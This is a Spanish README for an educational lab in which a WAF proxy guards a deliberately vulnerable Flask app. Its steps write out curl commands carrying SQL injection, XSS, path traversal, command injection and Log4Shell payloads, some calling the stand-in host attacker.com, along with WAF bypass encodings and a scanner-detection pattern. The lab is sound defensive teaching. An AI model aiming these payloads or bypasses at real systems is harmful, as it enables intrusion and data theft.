# Escenario WAF + ModSecurity — Flask + Nginx

## Descripción General

Este escenario simula una **aplicación web Flask** protegida por un **Web Application Firewall (WAF)** basado en **ModSecurity** funcionando como módulo de **Nginx** (proxy inverso). El objetivo es demostrar cómo un WAF intercepta y bloquea los ataques web más comunes del **OWASP Top 10** antes de que alcancen el backend.

**Conceptos demostrados:**
- Funcionamiento de un WAF como proxy inverso
- Detección y bloqueo de SQL Injection (CRS 942xxx)
- Detección y bloqueo de XSS — Cross-Site Scripting (CRS 941xxx)
- Detección y bloqueo de Path Traversal / LFI (CRS 930xxx)
- Detección y bloqueo de Command Injection (CRS 932xxx)
- Detección y bloqueo de Log4Shell CVE-2021-44228 (CRS 944xxx)
- Diferencia entre tráfico con y sin protección WAF
- Análisis de logs y estadísticas de ataques en tiempo real

---

## Topología de Red

```
   [cliente 10.0.2.10]        [atacante 10.0.2.20]
          |                          |
          +----------[  s1  ]--------+
                          |
               [ waf 10.0.2.80 ]
               Nginx + ModSecurity
               Proxy inverso :80
                          |
               [ webserver 10.0.2.90 ]
               Flask App vulnerable
               Backend :5000
                          |
               [ monitor 10.0.2.100 ]
               Analizador de logs WAF
```

**Flujo del tráfico:**
```
Usuario/Atacante  -->  WAF (puerto 80)  -->  Flask (puerto 5000)
                       |
                       +-- Petición maliciosa: 403 Forbidden (bloqueada)
                       |
                       +-- Petición limpia: reenvía al backend Flask
```

---

## Hosts y Configuración

| Host       | IP           | MAC               | Rol                        | Servicios                  |
|------------|--------------|-------------------|----------------------------|----------------------------|
| `cliente`  | 10.0.2.10    | 00:00:00:00:00:0a | Usuario legítimo            | curl, navegador web        |
| `atacante` | 10.0.2.20    | 00:00:00:00:00:14 | Atacante web                | web_attacker.py, curl      |
| `waf`      | 10.0.2.80    | 00:00:00:00:00:50 | Proxy WAF (Nginx+ModSec)   | waf_proxy.py :80           |
| `webserver`| 10.0.2.90    | 00:00:00:00:00:5a | Backend Flask               | flask_app.py :5000         |
| `monitor`  | 10.0.2.100   | 00:00:00:00:00:64 | Análisis de logs            | waf_monitor.py             |

---

## Archivos del Proyecto

| Archivo                  | Descripción                                                      |
|--------------------------|------------------------------------------------------------------|
| `waf_scenario.py`        | Topología Mininet y configuración del escenario                  |
| `flask_app.py`           | Aplicación Flask vulnerable (backend, puerto 5000)               |
| `waf_proxy.py`           | Proxy WAF con motor de reglas OWASP CRS (Nginx+ModSecurity)      |
| `web_attacker.py`        | Script de ataque: SQLi, XSS, LFI, CMDi, Log4Shell               |
| `waf_monitor.py`         | Monitor en tiempo real de logs y estadísticas WAF                |
| `setup_waf_scenario.sh`  | Script de instalación de dependencias                            |
| `README_WAF_MODSECURITY.md` | Esta documentación                                            |

---

## Requisitos Previos

```bash
# Instalar dependencias
sudo bash setup_waf_scenario.sh

# O manualmente:
sudo apt-get install -y python3 python3-pip mininet openvswitch-switch curl
pip3 install flask
```

---

## Cómo Funciona el Escenario

### 1. Backend Flask (`flask_app.py`)

Aplicación web Python con cuatro endpoints **intencionalmente vulnerables**:

| Endpoint           | Vulnerabilidad simulada       | Ejemplo de ataque                        |
|--------------------|-------------------------------|------------------------------------------|
| `GET /buscar?q=`   | XSS reflected, SQLi           | `q=<script>alert(1)</script>`            |
| `POST /login`      | SQL Injection                 | `user=admin' OR '1'='1`                  |
| `GET /archivo?f=`  | Path Traversal / LFI          | `f=../../../etc/passwd`                  |
| `GET /ping?host=`  | Command Injection             | `host=127.0.0.1;id`                      |
| `GET /api/info`    | Información del sistema       | JSON con metadata de la app              |

> **Nota:** Los endpoints no ejecutan comandos reales ni acceden a la base de datos. Reflejan el input para demostrar que el WAF debe bloquear la petición antes de que llegue aquí.

### 2. Proxy WAF (`waf_proxy.py`)

Proxy inverso HTTP con motor de reglas basado en **OWASP ModSecurity Core Rule Set (CRS)**:

| Categoría     | ID CRS   | Patrones | Severidad |
|---------------|----------|----------|-----------|
| SQL Injection | 942100   | 9        | CRITICAL  |
| XSS           | 941100   | 8        | HIGH      |
| Path Traversal| 930100   | 8        | HIGH      |
| CMDInjection  | 932100   | 6        | CRITICAL  |
| RFI           | 931100   | 2        | HIGH      |
| Log4Shell     | 944150   | 4        | CRITICAL  |

**Flujo de decisión del WAF:**
```
Petición HTTP entrante
       |
  ¿URL contiene payload malicioso?  -->  SÍ --> HTTP 403 + log ataque
       |
  ¿Headers contienen payload?        -->  SÍ --> HTTP 403 + log ataque
       |
  ¿Body POST contiene payload?       -->  SÍ --> HTTP 403 + log ataque
       |
  Petición limpia --> Forward a Flask :5000 --> log acceso
```

### 3. Script de Ataques (`web_attacker.py`)

Herramienta de prueba que envía peticiones maliciosas y legítimas, comparando el comportamiento con y sin WAF:
- Usa únicamente `urllib` (stdlib Python, sin dependencias externas)
- Detecta la cabecera `X-WAF-Action` para clasificar bloqueos vs. bypass
- Genera un resumen final con estadísticas por categoría

### 4. Monitor de Logs (`waf_monitor.py`)

Dashboard en tiempo real que:
- Lee `/tmp/waf_attack_log.txt` y `/tmp/waf_access_log.txt`
- Muestra estadísticas por categoría de ataque con barras ASCII
- Identifica las IPs atacantes más activas
- Lista los últimos 8 ataques detectados

---

## Guía de Uso Paso a Paso

### PASO 1 — Instalar dependencias

```bash
cd /home/mininet/entornos-tfm/waf-modsecurity
sudo bash setup_waf_scenario.sh
```

### PASO 2 — Iniciar el escenario

```bash
sudo python3 waf_scenario.py
```

El escenario inicia automáticamente:
- Flask en `webserver` (10.0.2.90:5000)
- Proxy WAF en `waf` (10.0.2.80:80)
- Monitor de logs en `monitor` (10.0.2.100)

### PASO 3 — Verificar conectividad

```bash
mininet> pingall
# Esperado: 0% dropped

mininet> cliente curl -s http://10.0.2.80/
# Esperado: página HTML de BancoApp (via WAF)

mininet> cliente curl -s http://10.0.2.90:5000/
# Esperado: misma página (acceso directo sin WAF)
```

### PASO 4 — Peticiones legítimas (deben pasar el WAF)

```bash
mininet> cliente curl "http://10.0.2.80/buscar?q=python+tutorial"
# Esperado: HTTP 200, resultados de búsqueda

mininet> cliente curl -X POST http://10.0.2.80/login \
         -d "user=admin&pass=admin123"
# Esperado: HTTP 200, login exitoso

mininet> cliente curl "http://10.0.2.80/archivo?f=manual.pdf"
# Esperado: HTTP 200, descripción del archivo
```

### PASO 5 — Ataques bloqueados por el WAF

```bash
# SQL Injection — debe retornar HTTP 403
mininet> atacante curl "http://10.0.2.80/login?user=admin'+OR+'1'='1&pass=x"
mininet> atacante curl "http://10.0.2.80/buscar?q=1+UNION+SELECT+*+FROM+users--"

# XSS — debe retornar HTTP 403
mininet> atacante curl "http://10.0.2.80/buscar?q=<script>alert(1)</script>"
mininet> atacante curl "http://10.0.2.80/buscar?q=<img+src=x+onerror=alert(1)>"

# Path Traversal — debe retornar HTTP 403
mininet> atacante curl "http://10.0.2.80/archivo?f=../../../etc/passwd"
mininet> atacante curl "http://10.0.2.80/archivo?f=%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# Command Injection — debe retornar HTTP 403
mininet> atacante curl "http://10.0.2.80/ping?host=127.0.0.1;cat+/etc/passwd"
mininet> atacante curl "http://10.0.2.80/ping?host=127.0.0.1|id"

# Log4Shell — debe retornar HTTP 403
# Opcion 1: --globoff evita que curl elimine los {} por su expansion de globs
mininet> atacante curl --globoff "http://10.0.2.80/buscar?q=\${jndi:ldap://attacker.com/a}"
# Opcion 2: payload URL-encoded (sin problemas de escaping de shell)
mininet> atacante curl "http://10.0.2.80/buscar?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D"
# Opcion 3: jndi: sin ${} (curl elimina las llaves con glob expansion — el WAF lo detecta igual)
mininet> atacante curl "http://10.0.2.80/buscar?q=jndi:ldap://attacker.com/exploit"
```

### PASO 6 — Comparar: con WAF vs. sin WAF

```bash
# Sin WAF: los ataques llegan al backend Flask (HTTP 200)
mininet> atacante curl "http://10.0.2.90:5000/login?user=admin'+OR+'1'='1"
# Esperado: HTTP 200/401 (el backend recibe el payload sin filtrar)

mininet> atacante curl "http://10.0.2.90:5000/buscar?q=<script>alert(1)</script>"
# Esperado: HTTP 200 (el XSS se refleja en la respuesta)

# Con WAF: los mismos ataques son bloqueados
mininet> atacante curl "http://10.0.2.80/login?user=admin'+OR+'1'='1"
# Esperado: HTTP 403 (WAF bloquea)
```

### PASO 7 — Script de ataque automatizado

```bash
# Ejecutar todos los ataques contra el WAF
mininet> atacante python3 /tmp/web_attacker.py --target 10.0.2.80 --all

# Solo SQL Injection
mininet> atacante python3 /tmp/web_attacker.py --target 10.0.2.80 --sqli

# Solo XSS
mininet> atacante python3 /tmp/web_attacker.py --target 10.0.2.80 --xss

# Solo Path Traversal
mininet> atacante python3 /tmp/web_attacker.py --target 10.0.2.80 --traversal

# Solo Command Injection
mininet> atacante python3 /tmp/web_attacker.py --target 10.0.2.80 --cmd

# Log4Shell
mininet> atacante python3 /tmp/web_attacker.py --target 10.0.2.80 --log4shell

# Peticiones legítimas (deben ser todas permitidas)
mininet> atacante python3 /tmp/web_attacker.py --target 10.0.2.80 --legit

# Sin WAF (mismo script, todos los ataques pasan)
mininet> atacante python3 /tmp/web_attacker.py --target 10.0.2.90 --port 5000 --all
```

### PASO 8 — Monitorear logs en tiempo real

```bash
# Ver ataques detectados
mininet> sh cat /tmp/waf_attack_log.txt

# Seguir logs en tiempo real
mininet> sh tail -f /tmp/waf_attack_log.txt

# Ver accesos permitidos
mininet> sh cat /tmp/waf_access_log.txt

# Log completo del proxy WAF
mininet> sh cat /tmp/waf_proxy.log
```

---

## Logs Generados

| Archivo                    | Descripción                                          |
|----------------------------|------------------------------------------------------|
| `/tmp/flask_app.log`       | Salida estándar de la aplicación Flask               |
| `/tmp/waf_proxy.log`       | Log completo del proxy WAF (peticiones + errores)    |
| `/tmp/waf_attack_log.txt`  | Registro de cada ataque detectado y bloqueado        |
| `/tmp/waf_access_log.txt`  | Registro de peticiones permitidas (tráfico limpio)   |
| `/tmp/waf_monitor_stdout.log` | Salida del proceso monitor                        |

**Formato del log de ataques:**
```
2026-05-02 12:30:45,123 | BLOQUEADO | IP:10.0.2.20 | GET /buscar?q=...
| Regla:942100 | Cat:SQLi | Sev:CRITICAL | Loc:URL | Payload:...UNION SELECT...
```

---

## Experimentos Adicionales

### Experimento 1: Reglas personalizadas
Edita `waf_proxy.py` y añade nuevas reglas a `WAF_RULES`. Por ejemplo, bloquear peticiones con `User-Agent: sqlmap`:

```python
{
    'id': '913100',
    'category': 'Scanner',
    'severity': 'HIGH',
    'name': 'Herramienta de escaneo detectada en User-Agent',
    'stat_key': 'otros',
    'patterns': [r"(?i)(sqlmap|nikto|nessus|openvas|nmap|masscan)"]
}
```

### Experimento 2: Bypass de WAF
Intenta evadir las reglas con técnicas de ofuscación:

```bash
# Variante con comentarios SQL
mininet> atacante curl "http://10.0.2.80/buscar?q=1+UN/**/ION+SE/**/LECT+1--"

# XSS con encoding de entidades HTML
mininet> atacante curl "http://10.0.2.80/buscar?q=&lt;script&gt;alert(1)&lt;/script&gt;"

# Path traversal con encoding doble
mininet> atacante curl "http://10.0.2.80/archivo?f=%252e%252e%252fetc%252fpasswd"
```

### Experimento 3: Modo monitor en consola separada
```bash
mininet> xterm monitor
# En la nueva terminal:
python3 /tmp/waf_monitor.py
```

---

## Conceptos de Seguridad Demostrados

| Concepto                  | Descripción                                                        |
|---------------------------|--------------------------------------------------------------------|
| **WAF como proxy inverso**| El WAF intercepta todo el tráfico antes de que llegue al backend   |
| **OWASP CRS**             | Core Rule Set: conjunto de reglas estándar anti-OWASP Top 10       |
| **Defense in depth**      | Múltiples capas de defensa (WAF + código seguro + DB sanitization) |
| **False positives**       | Reglas muy estrictas pueden bloquear tráfico legítimo              |
| **False negatives**       | Técnicas de bypass que evaden la detección del WAF                 |
| **Logging y auditoría**   | Los logs del WAF son esenciales para análisis forense              |
| **Zero-day protection**   | El WAF no protege contra vulnerabilidades desconocidas sin reglas  |

---

## Mitigaciones en Redes Reales

En entornos de producción se utilizarían soluciones completas como:

- **ModSecurity v3** integrado con **Nginx** o **Apache**
- **AWS WAF / Cloudflare WAF** (soluciones cloud)
- **OWASP CRS** (ModSecurity Core Rule Set) con reglas actualizadas
- **Paranoia levels** para ajustar la sensibilidad del WAF
- **Anomaly scoring**: las peticiones acumulan puntuación por cada regla activada; si supera un umbral, se bloquean
- **Rate limiting** para mitigar ataques de fuerza bruta y DDoS
- **IP reputation lists** para bloquear rangos maliciosos conocidos

---

## Troubleshooting

### El WAF devuelve 502 Bad Gateway
El backend Flask no está disponible. Verificar:
```bash
mininet> webserver python3 /tmp/flask_app.py &
mininet> webserver curl http://10.0.2.90:5000/
```

### Flask no está instalado
```bash
sudo pip3 install flask
# O instalar desde apt:
sudo apt-get install python3-flask
```
El script usa automáticamente `http.server` como fallback si Flask no está disponible.

### No se pueden ver logs
```bash
mininet> sh ls -la /tmp/waf_*.log /tmp/waf_*.txt 2>/dev/null
mininet> sh cat /tmp/waf_proxy.log
```

### El pingall falla
```bash
mininet> sh ovs-ofctl add-flow s1 priority=1,action=flood
mininet> pingall
```

### Reiniciar el escenario
```bash
mininet> exit
sudo mn -c
sudo python3 waf_scenario.py
```

---

## Advertencia Legal

> Este escenario es **exclusivamente educativo** y está diseñado para ejecutarse en un entorno de laboratorio aislado (Mininet). Los ataques web simulados no deben utilizarse contra sistemas reales sin autorización explícita por escrito del propietario. El uso no autorizado de estas técnicas puede ser ilegal según la legislación vigente.

### Autor: Mario Gil